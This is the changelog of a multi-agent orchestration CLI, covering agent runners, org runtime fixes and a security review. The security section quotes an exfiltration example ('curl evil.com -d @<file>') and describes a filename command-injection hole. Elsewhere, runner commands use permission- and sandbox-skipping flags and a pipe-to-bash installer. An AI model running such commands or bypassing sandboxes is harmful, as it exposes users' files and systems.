## [2.9.9] — 2026-08-14

### GitHub issue fixes (#141)

- **#141 — `control-start.cjs` no longer silently fails to auto-start the dashboard on Windows.** The `npx.cmd` last-resort fallback was spawned without `shell: true`, which Windows requires to exec a `.cmd`/`.bat` file; the call threw `EINVAL` synchronously and the wrapper's `main().catch(() => process.exit(0))` swallowed it with zero diagnostics. `spawn()` now sets `shell: true` when the resolved command ends in `.cmd`/`.bat` on `win32`, and the outer catch logs the failure (unless `MONOMIND_HOOK_QUIET`) and releases the spawn lock instead of exiting silently.

## [2.9.8] — 2026-08-14

> Rollup release cut from `main`. The 2.9.5–2.9.7 patch releases were cut from
> a `release/v2.9.5` branch and never ported their changelog back; 2.9.8
> reconciles both lines — everything below is in the 2.9.8 tarball.

### GitHub issue fixes (#133, #136–#140)

- **#140 — a role hitting `max_turns_per_message` no longer crashes the org.** A turn-limit error (thrown or `error_max_turns` result) now grants a bounded continuation turn with a fresh session instead of permanently dropping the role mid-task. **`monomind org run <name> --resume`** reconstructs role state from the persisted checkpoint (mailbox queues, policy usage, metrics, scrollback, SDK session ids) via `startOrg({resume})` — the checkpoint was previously write-only. `checkpoint.status` now tracks the runtime status it was captured under instead of always claiming `running`.
- **Default `max_turns_per_message` is now 100,000** (`DEFAULT_MAX_TURNS_PER_MESSAGE`) — effectively unlimited so the ceiling can never brick a legitimately long task. Real guardrails remain `budget_tokens`, the idle watchdog, and the circuit breaker. `org create` mentions it budget-style; explicit per-org/per-role values are preserved. The `org run` cost estimate caps its planning math at 30 turns/message so the unlimited default doesn't balloon it.
- **#139 — new `monomind ui` command** (alias `dashboard`) starts the Neural Control Room from the published CLI — `control-start.cjs`'s `npx monomind@latest ui` fallback path works now (`--port`, `--no-open`, `--project-dir`).
- **#137 — Windows SessionStart crash fixed.** The npx fallback resolves `npx.cmd` on win32 and the spawned child carries an `error` listener that releases the spawn lock instead of crashing the hook.
- **#138 — statusline `getActiveOrgs()` reads Org Runtime v2 `runtime.json`** (status + pid liveness) instead of a `runs/` directory the daemon never writes — the active-org row appears while an org is running. Also exposed in `--json` output.
- **#136 — dashboard visibility self-heals.** `control-start.cjs` treats an auth-walled 401 from `/api/status` as a foreign server (the adoption path was dead code under real auth). The org-run event forwarder warns once — unconditionally — when no live dashboard exists, treats a dead recorded pid as no-dashboard, and spawns the dashboard server itself (single-flight, same bound-report contract as control-start) so `org run` events no longer silently go nowhere.
- **#133 — route-outcome correlation wired.** `hooks route` records a `routeId` recommendation to `route-outcomes.jsonl`; session-end joins by `routeId` and backfills the measured outcome — the caller wiring `doctor`'s primary routing-learning path was waiting on.

### Runner fixes

- Vercel AI SDK v7 stream/usage field names corrected in `vercel-runner.ts` (usage deltas arrive on the final chunk; per-chunk field access produced NaN token counts).
- Kimi model namespace (`kimi-code/k3`) and Antigravity event parsing (`init` → `step_update` → `result`) corrections.
- `org run`'s cost estimate resolves each role's actual model (`resolveModel`) for labels instead of a hardcoded default.

### Library bumps (carrying main-only work to npm)

- `@monoes/hooks` 1.0.5 — Reflexion background worker (`worker-reflexion.ts`).
- `@monoes/mcp` 1.0.3 — MCP registry population (`registry-metadata.json`, `/registry` server routes).
- `@monoes/memory` 1.0.15, `@monoes/routing` 1.0.4 — version sync with npm content (no code change); keeps workspace pins monotone.
- `@monoes/monograph` stays 1.5.8.

### Graph engineering playbook — dynamic work graphs + structured handoffs

Adaptation of the July 2026 "Graph Engineering for Multi-Agentic Systems"
playbook (Ng). The org runtime's TaskDag graduates from a static dependency
tracker to a dynamic work graph. Source of truth: `docs/graph-engineering-playbook.md`.

#### Dynamic TaskDag operations (`task-dag.ts`)

- **`split(parentId, children)`** — scope expansion (playbook §2.2).
- **`merge(sourceId, targetId)`** — early convergence (playbook §2.2).
- **`cancel(taskId, reason?)`** — evidence made it moot (playbook §2.2).
- New statuses: `split`, `merged`, `cancelled`. New fields: `splitFrom`, `mergedInto`.

#### New agent tools (`session.ts`)

- **`org_task_split`**, **`org_task_merge`**, **`org_task_cancel`** — wrap the new DAG ops.
- **`org_plan_graph`** — work graph generator (playbook §2.4).

#### Structured Handoff Protocol (`types.ts`)

- **`OrgHandoffSchema`** — typed envelope for inter-role context packages (playbook §2.3).

#### Per-node failure routing (`types.ts`)

- **`FailureRoutingSchema`** — retry / fallback / escalate rules (playbook §2.6).

#### Graph observability (`types.ts`)

- **`trace` BusEvent type** — per-node execution traces (playbook §2.5).

#### Org templates (`templates.ts`)

- **`kg-extraction`** — 4-role multi-agent knowledge-graph extraction pipeline.
- **`advisor-orchestrator`** — cost-efficient planner + workers pattern (playbook §2.7).

#### Tests

- 61 new tests in `tests/orgrt/` (task-dag, graph-engineering-types, dag-ops, templates, session-tools).

### Universal provider support — Vercel AI SDK + Codex CLI runners

Two new `AgentRunner` implementations extend the org runtime beyond the
Claude/Kimi/Opencode trio. Combined with the existing runners, every major
subscription and API key auth path now has a first-class home.

#### `VercelAgentRunner` — any API-key provider via the Vercel AI SDK

- **Activation:** `runtime: 'vercel'` (per-role or org-level) or auto-resolved from `provider.kind: 'vercel-api-key'`
- **Vendor registry:** 15 providers — OpenAI, Anthropic, Google, xAI, DeepSeek, **GLM** (z.ai), Mistral, Groq, Together, Fireworks, Cohere, Perplexity, Alibaba, OpenRouter, Ollama — plus a generic `openai-compatible` escape hatch
- **Primitive:** `streamText + stopWhen: isStepCount(N)` (Vercel v7)
- **Tool delivery:** Native Vercel `tool()` calling with `canUseTool` policy gating (no fence protocol needed)
- **Session resume:** `VercelSessionStore` persists message history to disk (Vercel SDK is stateless)
- **Cost tracking:** Token-only (`cost_usd: 0` — Vercel returns no USD; token budgets still enforce via policy.ts)
- **Files:** `orgrt/vercel-runner.ts`, `orgrt/vercel-providers.ts`, `orgrt/vercel-session-store.ts`
- **Optional deps:** `ai`, `@ai-sdk/openai`, `@ai-sdk/anthropic`, `@ai-sdk/google`, `@ai-sdk/xai`, `@ai-sdk/deepseek`, `@ai-sdk/mistral`, `@ai-sdk/groq`, `@ai-sdk/togetherai`, `@ai-sdk/fireworks`, `@ai-sdk/cohere`, `@ai-sdk/perplexity`, `@ai-sdk/alibaba`, `@openrouter/ai-sdk-provider`, `ollama-ai-provider`

#### `CodexAgentRunner` — ChatGPT subscription via Codex CLI subprocess

- **Activation:** `runtime: 'codex'` or auto-resolved from `provider.kind: 'codex'`
- **Auth:** Inherits `~/.codex/auth.json` from `codex login` (ChatGPT Plus/Pro/Team/Enterprise). No API key needed.
- **Pattern:** Subprocess (same as `KimiCodeAgentRunner`) — spawns `codex exec --experimental-json --sandbox danger-full-access`, parses JSONL events
- **Tool delivery:** Fence protocol (same as kimi/opencode) — `executeToolCall` now accepts `canUseTool` for policy gating
- **Protocol:** Byte-accurate against `openai/codex/sdk/typescript/src` — `thread.started` captures `thread_id`, `item.completed` with `type: 'agent_message'` yields assistant text, `turn.completed` carries usage
- **Resume:** `codex exec resume <thread_id>` (positional, not a flag)
- **Files:** `orgrt/codex-runner.ts`, `orgrt/tool-fence.ts` (executeToolCall signature extended)

#### `AntigravityAgentRunner` — Google AI Pro/Ultra via Antigravity CLI

- **Activation:** `runtime: 'antigravity'` or auto-resolved from `provider.kind: 'antigravity'`
- **Auth:** OS keyring credentials from running `agy` interactively once (Google OAuth). Google AI Pro/Ultra consumer subscription flows through this — Gemini CLI's consumer OAuth was sunset June 18, 2026; Antigravity is the official replacement.
- **Pattern:** Subprocess (same as `KimiCodeAgentRunner` / `CodexAgentRunner`) — spawns `agy -p "<prompt>" --output-format stream-json --dangerously-skip-permissions`, parses NDJSON events
- **Protocol:** Event types `init` → `step_update` (multiple) → `result`. Session ID captured from `conversation_id`. Per-token streaming accumulated and emitted as one assistant message per turn (fence stripping needs full text; matches kimi/codex behavior).
- **Resume:** `--conversation <conversation_id>`
- **Tool delivery:** Fence protocol (same as kimi/codex/opencode)
- **Install:** Go binary via `curl -fsSL https://antigravity.google/cli/install.sh | bash` (no npm package)
- **Files:** `orgrt/antigravity-runner.ts`

#### Schema + provider resolution

- `ProviderSchema.kind` extended: `'vercel-api-key'`, `'codex'` (existing kinds unchanged — backward compatible)
- `ProviderSchema.vendor` field added (15 values + `openai-compatible`)
- `runtime` enum extended in `RoleSchema` + `OrgDefSchema`: `'vercel'`, `'codex'`
- `resolveRunner()` + `resolveRoleRunner()` in `daemon.ts` now auto-resolve runtime from provider kind when no explicit `runtime` field is set
- `resolveModel()` in `session.ts` returns per-vendor default models (e.g. GLM → `glm-5.2`, Codex → `gpt-5.6-terra`, DeepSeek → `deepseek-chat`); explicit `adapter_config.model` always wins

#### SDK upgrades

- `@anthropic-ai/claude-agent-sdk` 0.3.207 → 0.3.226 — unlocks Opus 5 (`model: 'opus'` or `'claude-opus-5'`), includes MCP-connection bug fixes, better error surfacing. No breaking changes.
- **Subagent depth change:** Claude SDK 0.3.217 lowered default subagent spawn depth from 5 to 1. Swarm code relying on deep nesting must set `CLAUDE_CODE_MAX_SUBAGENT_SPAWN_DEPTH=5`.
- **Kimi stderr fix:** `kimicode-runner.ts` now defensively extracts `session_id` from stderr as well as stdout (kimi 0.33+ may emit `session.resume_hint` on stderr in stream-json mode).

## [2.9.3] — 2026-08-11

### Publish, CLI startup, and doctor fixes (#119, #130, #131, #132)

- **#130 (critical) — `2.9.2` was uninstallable.** `packages/@monomind/cli/scripts/publish.sh` published with plain `npm publish`, which copies pnpm's `workspace:*` protocol verbatim into the tarball — `@monoes/monograph` resolved to the literal string `"workspace:*"`, which no consumer can install. Switched to `pnpm publish` (which resolves the pin correctly, same as the root package already does) and added `scripts/check-workspace-deps.mjs`, wired into the CLI package's `prepublishOnly`, to hard-block any future non-pnpm publish of a workspace-linked package.
- **#119 — lazy CLI command loading.** Every invocation (including `--version`) used to eagerly import all 32 command modules and their transitive dependencies (including the Claude Agent SDK via `org.ts`). `commands/index.ts` now lazy-loads each command on demand; `--version` imports none of them. A two-phase parse in `index.ts` resolves and registers only the invoked command's full subtree before parsing, preserving correct flag/alias scoping at any subcommand depth.
- **#131 — `doctor`'s npm check swallowed real errors.** `checkNpmVersion` mapped every failure (timeout, spawn error, genuine absence) to a fixed "npm not found" message even when npm was actually installed and working. It now distinguishes timeout vs `ENOENT` vs other errors and includes the underlying error detail.
- **#132 — `init` ran an undisclosed global install with no opt-out.** `monomind init` unconditionally ran `doctor --install` (which may `npm install -g @anthropic-ai/claude-code`) with no way to skip it and no notice before the network call. Added `monomind init --no-install`, and a one-line disclosure printed before the install actually runs.

## [2.9.2] — 2026-08-09

### PDF engine swap + post-init document ingestion

- **Replace pdf-parse with @firecrawl/pdf-inspector** — native Rust PDF extraction via napi-rs. Produces markdown output with headings, tables, and multi-column detection instead of plain text. ~47KB + platform binary vs 21MB for pdf-parse. Affects both Second Brain ingestion (`cap-documents.ts`) and knowledge graph indexing (`monograph/pdf-parse.ts`).
- **Post-init document ingestion prompt** — both `monomind init` and `monomind init --wizard` now ask whether to ingest documents into the knowledge graph (Second Brain) immediately after initialization.

## [2.9.1] — 2026-08-09

Release chore only — no user-facing changes.

## [2.9.0] — 2026-08-06

### Comprehensive review-fix release

Driven by a 7-agent review swarm that audited `packages/@monomind/cli/src/` (233 files, ~92k LOC) across seven dimensions. **28 issues fixed with regression tests (each test failed before, passes after)**; 11 deferred items tracked as GitHub issues [#62–#73](https://github.com/monoes/monomind/issues?q=label:review-swarm).

**Test results:** 820 passed / 13 failed → **884 passed / 0 failed** (+64 passing, −13 failures).

#### 🔒 Security (privacy-claim violations closed)

- **Command injection in document extraction (C1)** — `packages/@monomind/cli/src/capabilities/cap-documents.ts:39,52,60,247`. `execSync(\`unzip -p ${JSON.stringify(filePath)} …\`)` was exploitable via crafted `.docx`/`.pptx`/`.odt` filenames containing `$(…)` or backticks (JSON.stringify doesn't escape shell expansions inside double quotes). Fixed with `execFileSync('unzip', ['-p', filePath, …])` (no shell). 6/6 PoC tests cover the regression.
- **`terminal_execute` opt-in gate (C2)** — `packages/@monomind/cli/src/mcp-tools/terminal-tools.ts`. The metacharacter denylist cannot stop direct-binary exfiltration (`curl evil.com -d @<file>` has no metacharacters). `terminal_execute` now refuses to run unless `MONOMIND_ENABLE_TERMINAL=1` env var OR `.monomind/enable-terminal.json` opts in. Discovery tools keep working without opt-in.
- **Dashboard server binds to `127.0.0.1` (C3, Q6)** — `src/browser/dashboard/server.ts:160` and `src/orgrt/server.ts:131`. Both were binding to `::` / `0.0.0.0` (no host arg), exposing the unauthenticated dashboard + org daemon to anyone on the same LAN/VPN/Wi-Fi. Override available via `MONOMIND_BROWSE_DASHBOARD_HOST` / `MONOMIND_ORG_SERVER_HOST` env vars for container/SSH-tunnel users.
- **Crash-reporter redaction hardened (C6)** — `src/services/crash-reporter.ts:111-146`. Default-on crash reporting files public GitHub issues with the full `err.stack`; the old `redact()` only caught `/home/<user>` and 12 secret regexes, leaking project-relative paths (repo name + file structure + line numbers), non-`/Users` paths, IPv4/IPv6, internal hostnames, emails, SSNs, phones. The README's "secret/PII-scrubbed" claim is now actually true.
- **`fast-uri` CVE bump (Q1)** — `package.json` override `>=4.1.1` → `>=4.1.2` (GHSA-7p8r-x3mc-p8w7, high).

#### 🧱 Robustness

- **Atomic state writes for org runtime (C4)** — `src/orgrt/daemon.ts` (5 sites). `runtime.json`, `approvals.json`, branch `bus.jsonl`, heartbeat. Direct `writeFileSync(<final-path>, …)` could brick every `org status` / `isOrgRunning` / scheduler call on Ctrl-C during `org stop`. All 5 sites now use `writeJsonFileAtomic()` (tmp + rename).
- **`memory-bridge.ts` surfaces errors instead of swallowing (R1)** — 8 catch sites. SQLITE_BUSY, EACCES, disk-full no longer collapse to "no matches"; logged via new `logBridgeError(label, err)` helper (DEBUG/MONOMIND_DEBUG-gated).
- **`sql.js`-missing fallback no longer fakes a SQLite file (R2)** — `src/memory/memory-initializer.ts:352-405`. Old code wrote a 4 KB "SQLite format 3" header to disk and reported `success:true`; every subsequent read failed and `checkMemoryInitialization` looped forever. Now returns `success:false` with a clear install hint.
- **`busy_timeout:5000` for concurrent SQLite access (R3)** — added to the `@monoes/memory` config. Concurrent MCP server + CLI hook hitting the same `memory.db` no longer silently lose writes to SQLITE_BUSY.
- **Git worktree `execSync` calls carry `timeout:30000` (R4)** — 7 sites in `daemon.ts`. A wedged git hook (git-lfs, gc lock, gpg sign prompt) could previously hang the whole daemon forever.
- **`checkApproval`/`setApproval` serialized per-org (R5)** — Promise-chain mutex fixes the TOCTOU race on `this.approvals` + `approvals.json`.
- **`OrgCheckpoint` schema gains a `version` field (R6)** — `validateCheckpoint` now detects shape changes explicitly instead of silently failing the checksum.
- **`OrgBus.emit` surfaces durable-log append failures (R7)** — emits a follow-up audit event so lost events are attributable in run history instead of DEBUG-only swallow.
- **Latent checkpoint checksum bug fixed** — `generateChecksum` was using `JSON.stringify(state, Object.keys(state).sort())`. Passing an array as the second arg makes it a *whitelist* applied at EVERY nesting level; nested fields like `roleState.boss.tokensUsed` were silently stripped from the canonical form. **`validateCheckpoint` provided ZERO integrity guarantee since the feature shipped.** Fixed with recursive `stableNormalize` + SHA-256 (truncated to 64 bits).
- **Pre-existing ESM hygiene test failure fixed (Q7)** — `daemon.ts:423` had a bare `require('node:child_process')` that vitest's CJS shim masked but the built package threw "require is not defined" in real Node ESM execution.

#### 🚀 Performance

- **Monograph staleness cached per-repo for 30s (P2)** — `src/mcp-tools/monograph-tools.ts`. Cuts a 50–100ms `git rev-list --count` spawn from every `monograph_query` / `_suggest` / `_staleness` / `_health` call.
- **PPR rerank N+1 batched into `WHERE id IN (?, ?, …)` (P3)** — was ~50 round-trips per call, now 2.

#### 📋 Test coverage for previously-untested critical paths

- **`OrgCheckpoint` round-trip (T3, 9 tests)** — capture → validate → tamper → reject for roleState, pendingRoles, version field, TTL expiry, JSON round-trip.
- **`memory-tools` input validation (T1, 11 tests)** — `pattern-search` rejects empty/NUL/ANSI/oversized queries; `pattern-store` rejects empty/NUL keys and NUL values; `feedback` clamps score to [0,1]; `sanitizeError` strips filesystem paths from returned messages.

#### 🏗 Architecture

- **`mcp-tools/types.ts` path helpers extracted to `utils/paths.ts` (A1)** — `getProjectCwd` / `getMonomindDataRoot` / `migrateLegacyStoreFile` moved. Dependency direction is now correct: tool layer consumes path infra, not the reverse.
- **Circular dep broken between `mcp-client.ts` and `monomind-tools.ts` (A2)** — `monomind-tools.ts` now does a dynamic `import()` inside the handler instead of a static cycle.
- **4 orphan workspace packages deleted (A6)** — `@monomind/graph`, `@monomind/security`, `@monoes/monoplaybook`, `plugins/agentic-qe` (only stale build artifacts, no source).

#### ✨ New features & DX

- **`monomind init` emits a runnable sample org (C5)** — new `src/init/write-sample-org.ts`. Every successful `monomind init` writes a schema-valid `.monomind/orgs/sample-team.json` derived from the existing `content-team` template. The README's headline-feature onboarding was previously pointing at a file that didn't exist. Idempotent — never overwrites user edits.
- **Graph staleness surfaced in statusline (V4)** — `src/init/statusline-generator.ts`. Silent staleness was the most dangerous failure mode. Statusline now shows `⊛ <nodes>n <N>behind` with color escalating (green ≤3, gold ≤10, coral >10).
- **Global Documents dashboard section with markdown viewer** — new `📄 Documents` tab under the Global section. Surfaces mastermind-generated markdown across all known projects + the global brain, ordered by date, with a high-fidelity markdown renderer (headings with anchors, bold/italic/strikethrough, inline + fenced code with language label + copy button, unordered/ordered/nested/task lists, GFM tables with per-column alignment, nested blockquotes, horizontal rules, images, links with `rel=noopener`, YAML frontmatter stripping, HTML-escaped at boundary with `<script>`/`on*` handler stripping). Backend: `GET /api/global-docs` + `GET /api/global-doc/read?path=…` with path-traversal protection (403) and `.md`-only enforcement (400).
- **Dead-code cleanup** — deleted `transfer/types.ts` + `transfer/exports/` + dead `anonymization` exports (~740 LOC). Removed `eval-row6-*.json` from repo root and gitignored.
- **Pre-existing test failures fixed** — root-owned `.tmp-audit-test/` directory (leftover from a `sudo` run) was causing all 12 `tests/hive-mind/consensus.test.mjs` AuditWriter tests to fail with EACCES. Removed and gitignored.

#### ⚠️ Behavior changes (with escape hatches)

These changes are technically breaking for users who depended on the old behavior; each has a documented override.

- **`terminal_execute` now requires opt-in.** Set `MONOMIND_ENABLE_TERMINAL=1` or write `.monomind/enable-terminal.json` with `{"enabled":true}` to restore the old default-on behavior.
- **Dashboard + org servers bind to `127.0.0.1` only.** Set `MONOMIND_BROWSE_DASHBOARD_HOST=<host>` or `MONOMIND_ORG_SERVER_HOST=<host>` to bind a specific interface.
- **Crash-reporter redaction is stricter.** Stack traces now show basenames only (no project paths), and IPs/emails/hostnames/SSNs/phones are scrubbed. If you've been debugging crash-reporter output, you'll see less context.
- **`sql.js`-only fallback now fails honestly** instead of silently producing a non-functional DB. Install `sql.js` or `@monoes/memory` to re-enable.

#### 📝 Tracking follow-ups

11 items deferred with explicit rationale, each filed as a GitHub issue labeled [`review-swarm`](https://github.com/monoes/monomind/issues?q=label:review-swarm):

- #62 Delete `production/` dead-code package (v3.0.0 breaking change)
- #63 Curate unrouted agents in `.claude/agents/generated/`
- #64 Split god files (`init/executor.ts`, `monograph-tools.ts`, `OrgDaemon`)
- #65 Consolidate duplicated input-guard helpers
- #66 Add FTS5 to `memory_search` (biggest perf win, cross-package)
- #67 Bound dashboard maps with LRU eviction
- #68 Crash-reporter concurrency tests
- #69 Auto-update `executor`/`validator` tests (security boundary)
- #70 Wire up the dead LSP server + VS Code extension
- #71 Memory browser tab in dashboard
- #72 Real incremental graph updates (multi-day, biggest payoff)

Epic tracking all 11: **[#73](https://github.com/monoes/monomind/issues/73)**.

Full report: `docs/mastermind/reviews/2026-08-05-comprehensive-review-fixes.md`.

---

## [2.8.0] — 2026-07-31

### Antigravity (agy) Support

Monomind now officially supports **Google Antigravity (agy)** alongside Claude Code.

#### What's new

- **`monomind init` generates Antigravity files** — every init run now also creates:
  - `GEMINI.md` — agent instructions and MCP tool rules read by agy
  - `.gemini/rules/monomind.md` — workflow rules file (when to call monograph, memory, knowledge_search)
  - `.gemini/helpers/statusline.sh` — shell wrapper that drives the agy status bar
  - `.gemini/helpers/statusline.cjs` + `utils/` — full Node.js statusline engine (same as Claude Code)
  - `.gemini/settings.json` — wires `statusLine.command` so the status bar appears automatically

- **Status bar in agy** — the Monomind status bar (graph node count, stale nodes, agent routing, git state, session cost) now appears at the bottom of the agy chat window, exactly as it does in Claude Code's terminal UI. No manual setup required after `monomind init`.

- **Global agy settings auto-wired** — `monomind init` also updates `~/.gemini/antigravity-cli/settings.json` and writes `~/.gemini/antigravity-cli/statusline.sh` so the status bar works even before project-level init has run.

- **Org Runtime — multi-LLM providers** — `monomind org run` now supports `gemini` and `openai` provider kinds in org JSON files:
  ```json
  { "provider": { "kind": "gemini", "apiKeyEnv": "GEMINI_API_KEY" } }
  ```
  Org role sessions resolve `GEMINI_API_KEY` / `OPENAI_API_KEY` from the environment without embedding secrets.

- **`isDevRepo` sentinel relaxed** — the `[STALE_HELPERS]` check in `session-restore-handler.cjs` now correctly suppresses auto-heal when running inside the monomind dev repository (only `packages/@monomind/cli/package.json` presence required; no longer also requires the bundled `.claude/helpers` subtree).

## [2.5.0] — 2026-07-18


### Orgs can read your Second Brain
- Org agents get a `knowledge_search` tool: merged semantic search over the project's documents **and** your personal global brain, with the same project-first ranking as every other surface. Role briefings instruct agents to ground work in your actual documents; every lookup is a bus event visible in `org logs` / `org report`.

### Live document ingestion
- The dashboard server (long-lived, warm embedding model) watches the project and ingests changed `md/txt/pdf/docx` in-process within ~5 seconds of a save — no session restart needed. Platforms without recursive watch fall back silently to the session-start reindex.

### Global-brain polish
- Dashboard Second Brain search: project/global/all scope selector, `global` badges, real source-file labels.
- README + the generated per-project CLAUDE.md now teach the cross-project brain (auto-routing, `--store`, `--global`, OKF portability).

## [2.4.0] — 2026-07-18

### Global Second Brain (cross-project)
- One personal knowledge store at `~/.monomind/global-brain` (relocatable via `MONOMIND_GLOBAL_BRAIN_DIR`), structurally exempt from `cleanup --data`.
- **Zero-decision routing:** `doc ingest` on a path outside the current project auto-routes to the global brain (announced, overridable); `--global` forces it; `doc list/export --global`.
- **Merged retrieval everywhere:** `doc search`, the warm `/api/knowledge/search` endpoint, and per-prompt `[SECOND_BRAIN]` injection query project + global; project results win ties, global hits are labeled.
- Memory bridge refactored from a first-caller-wins singleton to a per-store instance cache (also fixes a latent store-misroute); excerpt provenance rides the `src:` ingest tag end-to-end.

## [2.3.x] — 2026-07-18

### 2.3.4 — Swarm-review hardening (round 2)
- Chunker: code-fence awareness (`#` lines in ``` blocks are never headings), CRLF normalization, backward-scan loop guards. (`@monoes/memory@1.0.8`)
- Memory engine: `UNIQUE(namespace,key)` enforced in better-sqlite3 (existing DBs deduped newest-wins), TTL-expired entries excluded from search, streaming row iteration.
- Org runtime: unified boss-selection for `org_complete` gating; `org answer` merges by question id instead of clobbering; `org logs` skips corrupt interior lines; `--run` flag validated; doc-metadata removal via append-only tombstones with compaction.
- Every failed CLI command now prints its failure reason (dispatcher-level fix).

Also in the 2.3.4 cycle: a 49-agent adversarial review of the week's modules confirmed 33 findings — **all 33 fixed**, including a critical `cleanup --data` rule that would have deleted live memory stores, and a silent org message-loss window during session restarts. Ledger: `docs/mastermind/plans/2026-07-18-swarm-review-findings.md`.

### 2.3.3 — Semantic per-prompt knowledge injection
- The dashboard server holds the local embedding model warm and serves `/api/knowledge/search` in ~60ms; every substantive Claude Code prompt gets its top knowledge excerpts injected automatically (`[SECOND_BRAIN]`), with tokenized keyword fallback and visible `(semantic)`/`(keyword)` provenance. Injection telemetry (never prompt text) in `.monomind/metrics/second-brain.jsonl`.

### 2.3.2 — Second Brain foundations
- Heading-aware chunking with `§ section` context prefixes; session-start reindex of changed documents; retrieval golden-set eval grown to 18 cases (80% paraphrase recall bar).
- Org cross-run memory: run outcomes stored per `memory_namespace`, `org_recall` tool for agents.
- `cleanup --data`: provable pruning of orphaned per-project stores via origin markers.
- Doctor: Second Brain model check.

### 2.3.1 — Memory engine replaced (LanceDB removed)
- The memory/Second Brain engine is now local SQLite (better-sqlite3, sql.js WASM fallback) storing text + embedding vectors, with local MiniLM embeddings — **~600MB of native dependencies removed** (`@lancedb/lancedb`, `apache-arrow`, onnx runtime stays for embeddings). (`@monoes/memory@1.0.6`)
- Fixed: semantic search over the native backend returned nothing (empty stub); keyword search required whole-phrase matches; namespace filters leaked across namespaces.
- Retrieval quality became a tested invariant: paraphrase golden-set eval in CI.

### 2.3.0 — Org Runtime v2 capability wave
- **Observability:** `org logs --follow` (live event tail), `org report` (outcome, per-role tokens vs budget, assets, crashes; `--all` for run history).
- **Outcomes + memory:** coordinator records run outcomes via `org_complete`; next run is briefed on the last; history in `<org>/history.jsonl`.
- **Headless HIL:** `org questions` / `org answer` — answer `ask_human` from the terminal, live or queued.
- **Resilience:** crashed agent sessions restart with backoff; crash detection in `org status`.
- **DX:** `org run --dry-run` (role-briefing preview), `org create --template content-team|dev-team|research-pod`, `org validate` (schema + structural invariants), informative `org list`, running-org guards on `stop`/`delete`.

## [2.2.0] — 2026-07-17 and earlier

- Org Runtime v2 (SDK daemon) baseline: per-role live agent sessions, `org_send` message bus, policy-gated tools, dashboard event forwarding, cross-process org discovery.
